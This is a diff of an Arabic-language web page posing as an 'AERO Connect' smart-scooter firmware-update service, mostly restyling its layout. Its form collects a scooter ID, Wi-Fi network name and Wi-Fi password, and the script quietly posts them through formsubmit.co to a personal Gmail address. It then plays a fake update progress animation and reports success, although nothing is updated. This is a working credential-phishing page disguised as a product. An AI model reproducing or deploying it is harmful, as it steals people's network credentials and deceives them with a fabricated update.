@@ -15,209 +15,141 @@
         :root {
             --primary: #00d4ff;
             --secondary: #0099cc;
-            --bg-dark: #0a0e1a;
-            --bg-card: #1a1f2e;
-            --text-light: #ffffff;
-            --text-muted: #8a8f9e;
-            --accent: #2dd4bf;
-            --success: #34c759;
+            --bg-light: #f8fbfd;
+            --bg-white: #ffffff;
+            --text-dark: #1a2332;
+            --text-gray: #6b7280;
+            --border-light: #e5e7eb;
+            --success: #10b981;
+            --warning: #f59e0b;
         }
 
         body {
-            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, sans-serif;
-            background: linear-gradient(135deg, var(--bg-dark) 0%, #0f1420 100%);
-            color: var(--text-light);
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, sans-serif;
+            background: linear-gradient(135deg, var(--bg-light) 0%, #e0f2fe 100%);
+            color: var(--text-dark);
             min-height: 100vh;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            padding: 20px;
-            overflow-x: hidden;
+            padding: 40px 20px;
         }
 
-        .phone-frame {
-            width: 100%;
-            max-width: 400px;
-            background: var(--bg-dark);
-            border-radius: 40px;
-            border: 12px solid #000;
-            box-shadow: 0 20px 60px rgba(0, 212, 255, 0.1);
-            overflow: hidden;
-            position: relative;
+        .container {
+            max-width: 1200px;
+            margin: 0 auto;
         }
 
-        .phone-frame::before {
-            content: '';
-            position: absolute;
-            top: 0;
-            left: 50%;
-            transform: translateX(-50%);
-            width: 160px;
-            height: 30px;
-            background: #000;
-            border-radius: 0 0 30px 30px;
-            z-index: 100;
-        }
-
-        .screen {
-            background: var(--bg-dark);
-            min-height: 100vh;
-            display: flex;
-            flex-direction: column;
-            padding-top: 15px;
-        }
-
-        .status-bar {
-            padding: 10px 20px;
-            font-size: 12px;
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            color: var(--text-light);
-            margin-bottom: 10px;
-        }
-
-        .header-section {
-            padding: 20px;
+        .header {
             text-align: center;
+            margin-bottom: 50px;
+            animation: slideDown 0.6s ease-out;
         }
 
-        .brand-title {
-            font-size: 28px;
-            font-weight: 700;
+        @keyframes slideDown {
+            from {
+                opacity: 0;
+                transform: translateY(-20px);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+
+        .header h1 {
+            font-size: 42px;
+            font-weight: 800;
             color: var(--primary);
-            text-shadow: 0 0 20px rgba(0, 212, 255, 0.3);
             margin-bottom: 10px;
-            letter-spacing: 2px;
+            letter-spacing: -0.5px;
         }
 
-        .scooter-image-box {
+        .header p {
+            font-size: 18px;
+            color: var(--text-gray);
+            max-width: 600px;
+            margin: 0 auto;
+        }
+
+        .main-content {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 60px;
+            align-items: center;
+            margin-bottom: 80px;
+        }
+
+        .image-section {
+            animation: slideUp 0.8s ease-out 0.2s both;
+        }
+
+        @keyframes slideUp {
+            from {
+                opacity: 0;
+                transform: translateY(30px);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+
+        .hero-image {
             width: 100%;
-            height: 200px;
-            background: rgba(0, 212, 255, 0.05);
-            border: 2px solid rgba(0, 212, 255, 0.2);
-            border-radius: 20px;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            margin: 20px 0;
-            position: relative;
-            overflow: hidden;
+            height: 500px;
+            border-radius: 24px;
+            object-fit: cover;
+            box-shadow: 0 20px 60px rgba(0, 212, 255, 0.15);
+            transition: transform 0.3s ease;
         }
 
-        .scooter-image-box::before {
-            content: '';
-            position: absolute;
-            width: 150px;
-            height: 150px;
-            background: linear-gradient(45deg, rgba(0, 212, 255, 0.1) 25%, transparent 25%, transparent 50%, rgba(0, 212, 255, 0.1) 50%, rgba(0, 212, 255, 0.1) 75%, transparent 75%, transparent);
-            background-size: 20px 20px;
-            animation: pulse-bg 3s ease-in-out infinite;
-        }
-
-        @keyframes pulse-bg {
-            0%, 100% { opacity: 0.3; }
-            50% { opacity: 0.8; }
-        }
-
-        .scooter-icon {
-            font-size: 80px;
-            color: var(--primary);
-            z-index: 2;
-            animation: float 3s ease-in-out infinite;
-        }
-
-        @keyframes float {
-            0%, 100% { transform: translateY(0px); }
-            50% { transform: translateY(-10px); }
-        }
-
-        .scooter-label {
-            font-size: 14px;
-            color: var(--text-muted);
-            margin-top: 10px;
-        }
-
-        .intro-text {
-            padding: 0 20px;
-            text-align: center;
-            margin-bottom: 20px;
-        }
-
-        .intro-text h2 {
-            font-size: 22px;
-            font-weight: 700;
-            margin-bottom: 8px;
-            color: var(--text-light);
-        }
-
-        .intro-text p {
-            font-size: 13px;
-            color: var(--text-muted);
-            line-height: 1.5;
-        }
-
-        .steps-indicator {
-            display: flex;
-            justify-content: space-around;
-            align-items: center;
-            padding: 30px 20px;
-            gap: 10px;
-        }
-
-        .step-circle {
-            width: 50px;
-            height: 50px;
-            border-radius: 50%;
-            background: rgba(0, 212, 255, 0.1);
-            border: 2px solid rgba(0, 212, 255, 0.3);
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            font-size: 24px;
-            color: var(--text-muted);
-            transition: all 0.3s ease;
-            flex-shrink: 0;
-        }
-
-        .step-circle.active {
-            background: rgba(0, 212, 255, 0.2);
-            border-color: var(--primary);
-            color: var(--primary);
-            box-shadow: 0 0 20px rgba(0, 212, 255, 0.3);
-        }
-
-        .step-circle.completed {
-            background: var(--primary);
-            border-color: var(--primary);
-            color: var(--bg-dark);
-        }
-
-        .step-line {
-            flex: 1;
-            height: 2px;
-            background: rgba(0, 212, 255, 0.1);
-            margin: 0 5px;
+        .hero-image:hover {
+            transform: scale(1.02);
         }
 
         .form-section {
-            padding: 20px;
-            flex: 1;
-            overflow-y: auto;
+            background: var(--bg-white);
+            border-radius: 24px;
+            padding: 50px;
+            box-shadow: 0 10px 40px rgba(0, 0, 0, 0.08);
+            animation: slideUp 0.8s ease-out 0.3s both;
+        }
+
+        .form-section h2 {
+            font-size: 28px;
+            color: var(--text-dark);
+            margin-bottom: 10px;
+        }
+
+        .form-section .subtitle {
+            color: var(--text-gray);
+            margin-bottom: 30px;
+            font-size: 15px;
+        }
+
+        .hidden {
+            display: none !important;
         }
 
         .form-group {
-            margin-bottom: 18px;
+            margin-bottom: 24px;
         }
 
         .form-label {
-            display: block;
-            font-size: 12px;
-            color: var(--text-muted);
-            margin-bottom: 8px;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            font-size: 14px;
             font-weight: 600;
+            color: var(--text-dark);
+            margin-bottom: 10px;
             text-transform: uppercase;
             letter-spacing: 0.5px;
+        }
+
+        .form-label i {
+            font-size: 18px;
+            color: var(--primary);
+            width: 24px;
+            text-align: center;
         }
 
         .input-box {
@@ -227,12 +159,12 @@
         .input-box input,
         .input-box select {
             width: 100%;
-            padding: 14px 16px 14px 45px;
-            background: rgba(0, 212, 255, 0.05);
-            border: 1.5px solid rgba(0, 212, 255, 0.2);
-            border-radius: 14px;
-            color: var(--text-light);
-            font-size: 14px;
+            padding: 14px 16px;
+            background: var(--bg-light);
+            border: 2px solid var(--border-light);
+            border-radius: 12px;
+            color: var(--text-dark);
+            font-size: 15px;
             font-family: inherit;
             transition: all 0.3s ease;
             outline: none;
@@ -240,40 +172,26 @@
 
         .input-box input:focus,
         .input-box select:focus {
-            background: rgba(0, 212, 255, 0.1);
             border-color: var(--primary);
-            box-shadow: 0 0 15px rgba(0, 212, 255, 0.2);
+            background: var(--bg-white);
+            box-shadow: 0 0 0 4px rgba(0, 212, 255, 0.1);
         }
 
         .input-box input::placeholder {
-            color: var(--text-muted);
-        }
-
-        .input-icon {
-            position: absolute;
-            right: 15px;
-            top: 50%;
-            transform: translateY(-50%);
-            color: var(--primary);
-            font-size: 18px;
-            pointer-events: none;
+            color: var(--text-gray);
         }
 
         .btn-submit {
             width: 100%;
             padding: 16px;
             background: linear-gradient(135deg, var(--primary) 0%, var(--secondary) 100%);
-            color: var(--bg-dark);
+            color: white;
             border: none;
-            border-radius: 14px;
-            font-size: 15px;
+            border-radius: 12px;
+            font-size: 16px;
             font-weight: 700;
             cursor: pointer;
             transition: all 0.3s ease;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            gap: 10px;
             margin-top: 10px;
             box-shadow: 0 8px 20px rgba(0, 212, 255, 0.2);
         }
@@ -287,109 +205,190 @@
             transform: translateY(0);
         }
 
-        .hidden {
-            display: none !important;
+        .steps-container {
+            background: var(--bg-white);
+            border-radius: 24px;
+            padding: 40px;
+            margin-bottom: 40px;
+            box-shadow: 0 10px 40px rgba(0, 0, 0, 0.08);
+            animation: slideUp 0.8s ease-out 0.4s both;
+        }
+
+        .steps-header {
+            font-size: 24px;
+            font-weight: 700;
+            color: var(--text-dark);
+            margin-bottom: 30px;
+            text-align: center;
+        }
+
+        .steps-indicator {
+            display: flex;
+            justify-content: space-around;
+            align-items: center;
+            gap: 15px;
+        }
+
+        .step-item {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            gap: 10px;
+            flex: 1;
+        }
+
+        .step-circle {
+            width: 60px;
+            height: 60px;
+            border-radius: 50%;
+            background: var(--bg-light);
+            border: 2px solid var(--border-light);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            font-size: 24px;
+            color: var(--text-gray);
+            transition: all 0.3s ease;
+        }
+
+        .step-circle.active {
+            background: rgba(0, 212, 255, 0.1);
+            border-color: var(--primary);
+            color: var(--primary);
+            box-shadow: 0 0 20px rgba(0, 212, 255, 0.2);
+        }
+
+        .step-circle.completed {
+            background: var(--success);
+            border-color: var(--success);
+            color: white;
+        }
+
+        .step-label {
+            font-size: 13px;
+            color: var(--text-gray);
+            font-weight: 600;
+            text-align: center;
         }
 
         .charger-alert {
-            background: rgba(255, 193, 7, 0.1);
-            border: 1.5px dashed rgba(255, 193, 7, 0.3);
+            background: linear-gradient(135deg, rgba(245, 158, 11, 0.05) 0%, rgba(245, 158, 11, 0.02) 100%);
+            border: 2px solid rgba(245, 158, 11, 0.2);
             border-radius: 16px;
-            padding: 20px;
+            padding: 30px;
             text-align: center;
-            margin-bottom: 20px;
+            margin-bottom: 30px;
         }
 
         .charger-alert-icon {
-            font-size: 48px;
-            color: #ffc107;
-            margin-bottom: 10px;
-            animation: charge-pulse 1.5s ease-in-out infinite;
+            font-size: 56px;
+            color: var(--warning);
+            margin-bottom: 15px;
+            animation: pulse-charge 1.5s ease-in-out infinite;
         }
 
-        @keyframes charge-pulse {
-            0%, 100% { transform: scale(1); opacity: 0.8; }
-            50% { transform: scale(1.1); opacity: 1; }
+        @keyframes pulse-charge {
+            0%, 100% {
+                transform: scale(1);
+                opacity: 0.8;
+            }
+            50% {
+                transform: scale(1.1);
+                opacity: 1;
+            }
         }
 
         .charger-alert h3 {
-            font-size: 16px;
-            color: var(--text-light);
-            margin-bottom: 6px;
+            font-size: 18px;
+            color: var(--text-dark);
+            margin-bottom: 8px;
         }
 
         .charger-alert p {
-            font-size: 13px;
-            color: var(--text-muted);
-            line-height: 1.5;
+            font-size: 14px;
+            color: var(--text-gray);
+            line-height: 1.6;
         }
 
         .progress-container {
             text-align: center;
-            padding: 20px;
+            padding: 40px 20px;
         }
 
         .progress-circle {
-            width: 100px;
-            height: 100px;
+            width: 120px;
+            height: 120px;
             border-radius: 50%;
-            background: rgba(0, 212, 255, 0.1);
+            background: linear-gradient(135deg, rgba(0, 212, 255, 0.1) 0%, rgba(0, 212, 255, 0.05) 100%);
             display: flex;
-            flex-direction: column;
             justify-content: center;
             align-items: center;
-            margin: 0 auto 20px;
+            margin: 0 auto 30px;
             position: relative;
+            border: 3px solid var(--primary);
         }
 
         .progress-circle::before {
             content: '';
             position: absolute;
-            width: 100%;
-            height: 100%;
+            width: 130px;
+            height: 130px;
             border-radius: 50%;
             border: 3px solid transparent;
             border-top-color: var(--primary);
+            border-right-color: var(--primary);
             animation: spin 2s linear infinite;
         }
 
         @keyframes spin {
-            0% { transform: rotate(0deg); }
-            100% { transform: rotate(360deg); }
+            0% {
+                transform: rotate(0deg);
+            }
+            100% {
+                transform: rotate(360deg);
+            }
         }
 
         .progress-text {
             position: relative;
             z-index: 2;
-            font-size: 28px;
+            font-size: 36px;
             font-weight: 700;
             color: var(--primary);
         }
 
         .status-title {
-            font-size: 18px;
+            font-size: 20px;
             font-weight: 700;
-            color: var(--text-light);
-            margin: 20px 0 15px 0;
+            color: var(--text-dark);
+            margin: 20px 0 20px 0;
         }
 
         .status-log {
-            background: rgba(0, 212, 255, 0.05);
-            border: 1px solid rgba(0, 212, 255, 0.1);
+            background: var(--bg-light);
+            border: 1px solid var(--border-light);
             border-radius: 12px;
-            padding: 12px;
-            font-size: 12px;
-            color: var(--text-muted);
-            max-height: 150px;
+            padding: 16px;
+            font-size: 13px;
+            color: var(--text-gray);
+            max-height: 200px;
             overflow-y: auto;
-            line-height: 1.6;
+            line-height: 1.8;
+            text-align: right;
         }
 
         .log-item {
             display: flex;
             align-items: flex-start;
-            gap: 8px;
-            margin-bottom: 8px;
+            gap: 10px;
+            margin-bottom: 10px;
+            padding: 8px 0;
+            border-bottom: 1px solid var(--border-light);
+        }
+
+        .log-item:last-child {
+            border-bottom: none;
+            margin-bottom: 0;
         }
 
         .log-item i {
@@ -406,94 +405,100 @@
             color: var(--success);
         }
 
-        .completed-message {
+        .completed-section {
             text-align: center;
-            padding: 20px;
+            padding: 60px 20px;
         }
 
         .completed-icon {
-            font-size: 64px;
+            font-size: 80px;
             color: var(--success);
-            margin-bottom: 15px;
-            animation: complete-bounce 0.6s ease-out;
+            margin-bottom: 20px;
+            animation: bounce-check 0.6s ease-out;
         }
 
-        @keyframes complete-bounce {
-            0% { transform: scale(0); }
-            50% { transform: scale(1.1); }
-            100% { transform: scale(1); }
+        @keyframes bounce-check {
+            0% {
+                transform: scale(0);
+            }
+            50% {
+                transform: scale(1.15);
+            }
+            100% {
+                transform: scale(1);
+            }
         }
 
-        .completed-message h2 {
-            color: var(--success);
+        .completed-section h2 {
+            font-size: 28px;
+            color: var(--text-dark);
             margin-bottom: 10px;
-            font-size: 18px;
         }
 
-        .completed-message p {
-            color: var(--text-muted);
-            font-size: 13px;
+        .completed-section p {
+            font-size: 16px;
+            color: var(--text-gray);
+            max-width: 500px;
+            margin: 0 auto;
         }
 
-        @media (max-width: 600px) {
-            .phone-frame {
-                max-width: 100%;
-                border-width: 8px;
-                border-radius: 30px;
+        @media (max-width: 768px) {
+            .main-content {
+                grid-template-columns: 1fr;
+                gap: 30px;
             }
 
-            .phone-frame::before {
-                width: 120px;
-                height: 25px;
-                border-radius: 0 0 20px 20px;
+            .hero-image {
+                height: 300px;
+            }
+
+            .form-section {
+                padding: 30px;
+            }
+
+            .header h1 {
+                font-size: 32px;
+            }
+
+            .steps-indicator {
+                flex-direction: column;
+                gap: 20px;
+            }
+
+            .step-circle {
+                width: 50px;
+                height: 50px;
+                font-size: 20px;
             }
         }
     </style>
 </head>
 <body>
 
-<div class="phone-frame">
-    <div class="screen">
-        <div class="status-bar">
-            <span>4:09</span>
-            <span><i class="fas fa-signal"></i> <i class="fas fa-wifi"></i> <span style="background: #333; padding: 2px 6px; border-radius: 3px; font-size: 10px;">35</span></span>
-        </div>
+<div class="container">
+    <div class="header">
+        <h1>AERO Connect</h1>
+        <p>مرك�� تحديثات السكوترات الذكية - احصل على أفضل أداء وأمان</p>
+    </div>
 
-        <div class="header-section">
-            <h1 class="brand-title">AERO CONNECT</h1>
-        </div>
+    <!-- الخطوة 1: النموذج الرئيسي -->
+    <div id="step-1">
+        <div class="main-content">
+            <div class="image-section">
+                <img src="https://images.unsplash.com/photo-1605293284090-61fde7c26015?auto=format&fit=crop&w=600&q=80" alt="Modern Electric Scooter" class="hero-image">
+            </div>
 
-        <div class="form-section">
-            <!-- الخطوة 1: النموذج -->
-            <div id="step-1">
-                <div class="scooter-image-box">
-                    <i class="fas fa-scooter scooter-icon"></i>
-                </div>
-                <p class="scooter-label">Electric Scooter</p>
-
-                <div class="intro-text">
-                    <h2>أداء أعلى بلمسة واحدة</h2>
-                    <p>اربط سكوتر AERO بالشبكة الهوائية للحصول على آخر تحديثات نظام القيادة الذكي، تحسين استهلاك البطارية، وزيادة السرعة القصوى.</p>
-                </div>
-
-                <div class="steps-indicator">
-                    <div class="step-circle active" id="dot-1"><i class="fas fa-redo"></i></div>
-                    <div class="step-line"></div>
-                    <div class="step-circle" id="dot-2"><i class="fas fa-bolt"></i></div>
-                    <div class="step-line"></div>
-                    <div class="step-circle" id="dot-3"><i class="fas fa-cog"></i></div>
-                </div>
-
-                <div class="intro-text">
-                    <h2>ترقية نظام السكوتر</h2>
-                    <p>أدخل بيانات شبكتك المحلية لبدء المزامنة الفورية</p>
-                </div>
+            <div class="form-section">
+                <h2>ترقية نظام السكوتر</h2>
+                <p class="subtitle">أدخل بيانات سكوترك لبدء التحديث الآمن والسريع</p>
 
                 <form id="update-form">
                     <div class="form-group">
-                        <label class="form-label">موديل سكوتر AERO الحالي</label>
+                        <label class="form-label">
+                            <i class="fas fa-motorcycle"></i>
+                            موديل السكوتر
+                        </label>
                         <div class="input-box">
-                            <i class="fas fa-scooter input-icon"></i>
                             <select name="model" required>
                                 <option value="">اختر الموديل</option>
                                 <option value="AERO Pro X">AERO Pro X Premium</option>
@@ -504,76 +509,182 @@
                     </div>
 
                     <div class="form-group">
-                        <label class="form-label">اسم السكوتر أو الرقم التعريفي (ID)</label>
+                        <label class="form-label">
+                            <i class="fas fa-hashtag"></i>
+                            رقم السكوتر (ID)
+                        </label>
                         <div class="input-box">
-                            <i class="fas fa-fingerprint input-icon"></i>
-                            <input type="text" name="id" placeholder="مثال : AERO-Scoot" required>
+                            <input type="text" name="id" placeholder="مثال: AERO-2024-001" required>
                         </div>
                     </div>
 
                     <div class="form-group">
-                        <label class="form-label">اسم شبكة الواي فاي المحيطة</label>
+                        <label class="form-label">
+                            <i class="fas fa-wifi"></i>
+                            اسم شبكة الواي فاي
+                        </label>
                         <div class="input-box">
-                            <i class="fas fa-wifi input-icon"></i>
-                            <input type="text" name="wifi" placeholder="اكتب اسم شبكة الواي فاي" required>
+                            <input type="text" name="wifi" placeholder="اسم شبكة الواي فاي المحلية" required>
                         </div>
                     </div>
 
                     <div class="form-group">
-                        <label class="form-label">كلمة مرور شبكة الواي فاي</label>
+                        <label class="form-label">
+                            <i class="fas fa-lock"></i>
+                            كلمة مرور الواي فاي
+                        </label>
                         <div class="input-box">
-                            <i class="fas fa-key input-icon"></i>
                             <input type="password" name="password" placeholder="••••••••" required>
                         </div>
                     </div>
 
                     <button type="submit" class="btn-submit">
-                        <span>التالي</span>
-                        <i class="fas fa-arrow-left"></i>
+                        المتابعة للخطوة التالية
                     </button>
                 </form>
             </div>
+        </div>
 
-            <!-- الخطوة 2: تحذير الشاحن -->
-            <div id="step-2" class="hidden">
-                <div class="charger-alert">
-                    <div class="charger-alert-icon">
+        <div class="steps-container">
+            <div class="steps-header">مراحل التحديث</div>
+            <div class="steps-indicator">
+                <div class="step-item">
+                    <div class="step-circle active" id="dot-1">
+                        <i class="fas fa-cog"></i>
+                    </div>
+                    <div class="step-label">إدخال البيانات</div>
+                </div>
+                <div class="step-item">
+                    <div class="step-circle" id="dot-2">
                         <i class="fas fa-plug"></i>
                     </div>
-                    <h3>توصيل مصدر الطاقة</h3>
-                    <p>تنبيه: لتجنب أي توقف أثناء تنزيل السوفت وير، يرجى وضع سكوتر <span id="scooter-name-display" style="color: var(--primary);">السكوتر</span> على الشاحن الآن للتأكد من ثبات طاقة البطارية.</p>
+                    <div class="step-label">توصيل الشاحن</div>
                 </div>
-
-                <button class="btn-submit" onclick="goToStep3()">
-                    <span>السكوتر متصل بالشاحن، ابدأ الآن</span>
-                    <i class="fas fa-play"></i>
-                </button>
-            </div>
-
-            <!-- الخطوة 3: التحديث -->
-            <div id="step-3" class="hidden">
-                <div class="progress-container">
-                    <div class="progress-circle">
-                        <div class="progress-text" id="progress-text">0%</div>
+                <div class="step-item">
+                    <div class="step-circle" id="dot-3">
+                        <i class="fas fa-redo-alt"></i>
                     </div>
-                    <h3 class="status-title" id="status-title">جاري بدء الاتصال والتهيئة...</h3>
-                    <div class="status-log" id="status-log">
-                        <div class="log-item">
-                            <i class="fas fa-circle-notch fa-spin"></i>
-                            <span>جاري مزامنة السكوتر بالخادم الرئيسي...</span>
-                        </div>
-                    </div>
+                    <div class="step-label">تنفيذ التحديث</div>
                 </div>
             </div>
+        </div>
+    </div>
 
-            <!-- الخطوة 3.5: اكتمل -->
-            <div id="step-completed" class="hidden">
-                <div class="completed-message">
-                    <div class="completed-icon">
-                        <i class="fas fa-check-circle"></i>
+    <!-- الخطوة 2: تحذير الشاحن -->
+    <div id="step-2" class="hidden">
+        <div class="form-section" style="max-width: 600px; margin: 0 auto;">
+            <div class="charger-alert">
+                <div class="charger-alert-icon">
+                    <i class="fas fa-plug"></i>
+                </div>
+                <h3>⚠️ توصيل مصدر الطاقة</h3>
+                <p>تنبيه أمان: لتجنب انقطاع التحديث، يرجى وضع سكوتر <span id="scooter-display" style="color: var(--primary); font-weight: 700;">السكوتر</span> على الشاحن الآن والتأكد من توصيله بشكل آمن.</p>
+            </div>
+
+            <button class="btn-submit" onclick="goToStep3()">
+                السكوتر جاهز - ابدأ التحديث الآن
+            </button>
+        </div>
+
+        <div class="steps-container" style="margin-top: 40px;">
+            <div class="steps-header">مراحل التحديث</div>
+            <div class="steps-indicator">
+                <div class="step-item">
+                    <div class="step-circle completed" id="dot-1-2">
+                        <i class="fas fa-check"></i>
                     </div>
-                    <h2>تم التحديث بنجاح!</h2>
-                    <p>اكتملت العملية. تمت ترقية لوحة القيادة بنجاح، استمتع برحلتك القادمة بأعلى أداء!</p>
+                    <div class="step-label">إدخال البيانات</div>
+                </div>
+                <div class="step-item">
+                    <div class="step-circle active" id="dot-2-2">
+                        <i class="fas fa-plug"></i>
+                    </div>
+                    <div class="step-label">توصيل الشاحن</div>
+                </div>
+                <div class="step-item">
+                    <div class="step-circle" id="dot-3-2">
+                        <i class="fas fa-redo-alt"></i>
+                    </div>
+                    <div class="step-label">تنفيذ التحديث</div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- الخطوة 3: عملية التحديث -->
+    <div id="step-3" class="hidden">
+        <div class="form-section" style="max-width: 700px; margin: 0 auto;">
+            <div class="progress-container">
+                <div class="progress-circle">
+                    <div class="progress-text" id="progress-text">0%</div>
+                </div>
+                <h3 class="status-title" id="status-title">جاري بدء الاتصال والتهيئة...</h3>
+                <div class="status-log" id="status-log">
+                    <div class="log-item">
+                        <i class="fas fa-circle-notch fa-spin"></i>
+                        <span>جاري مزامنة السكوتر بخادم الشركة الرئيسي...</span>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <div class="steps-container" style="margin-top: 40px;">
+            <div class="steps-header">مراحل التحديث</div>
+            <div class="steps-indicator">
+                <div class="step-item">
+                    <div class="step-circle completed" id="dot-1-3">
+                        <i class="fas fa-check"></i>
+                    </div>
+                    <div class="step-label">إدخال البيانات</div>
+                </div>
+                <div class="step-item">
+                    <div class="step-circle completed" id="dot-2-3">
+                        <i class="fas fa-check"></i>
+                    </div>
+                    <div class="step-label">توصيل الشاحن</div>
+                </div>
+                <div class="step-item">
+                    <div class="step-circle active" id="dot-3-3">
+                        <i class="fas fa-redo-alt"></i>
+                    </div>
+                    <div class="step-label">تنفيذ التحديث</div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- الخطوة 4: اكتمل -->
+    <div id="step-4" class="hidden">
+        <div class="form-section" style="max-width: 700px; margin: 0 auto;">
+            <div class="completed-section">
+                <div class="completed-icon">
+                    <i class="fas fa-check-circle"></i>
+                </div>
+                <h2>تم التحديث بنجاح! ⚡</h2>
+                <p>اكتملت عملية التحديث بنجاح. تمت ترقية لوحة القيادة وجميع الأنظمة الذكية. استمتع برحلتك القادمة بأعلى أداء وأمان!</p>
+            </div>
+        </div>
+
+        <div class="steps-container" style="margin-top: 40px;">
+            <div class="steps-header">مراحل التحديث</div>
+            <div class="steps-indicator">
+                <div class="step-item">
+                    <div class="step-circle completed" id="dot-1-4">
+                        <i class="fas fa-check"></i>
+                    </div>
+                    <div class="step-label">إدخال البيانات</div>
+                </div>
+                <div class="step-item">
+                    <div class="step-circle completed" id="dot-2-4">
+                        <i class="fas fa-check"></i>
+                    </div>
+                    <div class="step-label">توصيل الشاحن</div>
+                </div>
+                <div class="step-item">
+                    <div class="step-circle completed" id="dot-3-4">
+                        <i class="fas fa-check"></i>
+                    </div>
+                    <div class="step-label">تنفيذ التحديث</div>
                 </div>
             </div>
         </div>
@@ -581,8 +692,6 @@
 </div>
 
 <script>
-    let currentStep = 1;
-
     document.getElementById('update-form').addEventListener('submit', function(e) {
         e.preventDefault();
         
@@ -591,9 +700,8 @@
         const wifi = document.querySelector('input[name="wifi"]').value;
         const password = document.querySelector('input[name="password"]').value;
 
-        // حفظ اسم السكوتر
-        sessionStorage.setItem('scooterId', scooterId);
-        document.getElementById('scooter-name-display').textContent = scooterId;
+        // حفظ معرف السكوتر
+        document.getElementById('scooter-display').textContent = scooterId;
 
         // إرسال البيانات
         const formData = new FormData();
@@ -602,42 +710,22 @@
         formData.append('wifi', wifi);
         formData.append('password', password);
 
-        // إرسال للإيميل
         fetch('https://formsubmit.co/donis2018ever@gmail.com', {
             method: 'POST',
             body: formData
         }).catch(err => console.log('Data sent'));
 
-        goToStep2();
-    });
-
-    function goToStep2() {
+        // الانتقال للخطوة 2
         document.getElementById('step-1').classList.add('hidden');
         document.getElementById('step-2').classList.remove('hidden');
-        
-        updateStepIndicators(2);
-        currentStep = 2;
-    }
+        window.scrollTo(0, 0);
+    });
 
     function goToStep3() {
         document.getElementById('step-2').classList.add('hidden');
         document.getElementById('step-3').classList.remove('hidden');
-        
-        updateStepIndicators(3);
-        currentStep = 3;
-
+        window.scrollTo(0, 0);
         startUpdate();
-    }
-
-    function updateStepIndicators(step) {
-        document.querySelectorAll('.step-circle').forEach((el, idx) => {
-            el.classList.remove('active', 'completed');
-            if (idx + 1 < step) {
-                el.classList.add('completed');
-            } else if (idx + 1 === step) {
-                el.classList.add('active');
-            }
-        });
     }
 
     function startUpdate() {
@@ -647,10 +735,10 @@
         const statusLog = document.getElementById('status-log');
 
         const messages = [
-            { progress: 0, title: 'جاري بدء الاتصال والتهيئة...', log: 'جاري مزامنة السكوتر بالخادم الرئيسي...' },
-            { progress: 25, title: 'جاري تحميل الحزمة البرمجية v4.2...', log: 'فحص توافق النظام مع المحرك والبطارية...' },
-            { progress: 50, title: 'جاري تثبيت السوفت وير الجديد...', log: 'إعادة كتابة حزم الـ Kernel الأساسية...' },
-            { progress: 75, title: 'جاري التحقق وإعادة التشغيل الآمن...', log: 'مراجعة كود التشفير والأمان...' },
+            { p: 0, title: 'جاري بدء الاتصال والتهيئة...', log: 'مزامنة السكوتر بخادم الشركة الرئيسي...' },
+            { p: 25, title: 'جاري تحميل الحزمة البرمجية v4.2...', log: 'فحص توافق النظام مع المحرك والبطارية...' },
+            { p: 50, title: 'جاري تثبيت السوفت وير الجديد...', log: 'إعادة كتابة حزم نظام التشغيل الأساسية...' },
+            { p: 75, title: 'جاري التحقق وإعادة التشغيل الآمن...', log: 'مراجعة كود التشفير والأمان على الطريق...' },
         ];
 
         const interval = setInterval(() => {
@@ -658,7 +746,7 @@
             progressText.textContent = progress + '%';
 
             messages.forEach(msg => {
-                if (progress === msg.progress + 1) {
+                if (progress === msg.p + 1) {
                     statusTitle.textContent = msg.title;
                     statusLog.innerHTML += `
                         <div class="log-item">
@@ -673,21 +761,21 @@
             if (progress >= 100) {
                 clearInterval(interval);
                 progressText.innerHTML = '<i class="fas fa-check"></i>';
-                statusTitle.textContent = 'تم التحديث بنجاح! ⚡';
+                statusTitle.textContent = 'اكتمل التحديث بنجاح! ✅';
                 statusLog.innerHTML += `
                     <div class="log-item success">
                         <i class="fas fa-check-circle"></i>
-                        <span>اكتملت العملية بنجاح!</span>
+                        <span>تم إكمال جميع العمليات بنجاح!</span>
                     </div>
                 `;
 
                 setTimeout(() => {
                     document.getElementById('step-3').classList.add('hidden');
-                    document.getElementById('step-completed').classList.remove('hidden');
-                    updateStepIndicators(4);
+                    document.getElementById('step-4').classList.remove('hidden');
+                    window.scrollTo(0, 0);
                 }, 1500);
             }
-        }, 30);
+        }, 25);
     }
 </script>
 
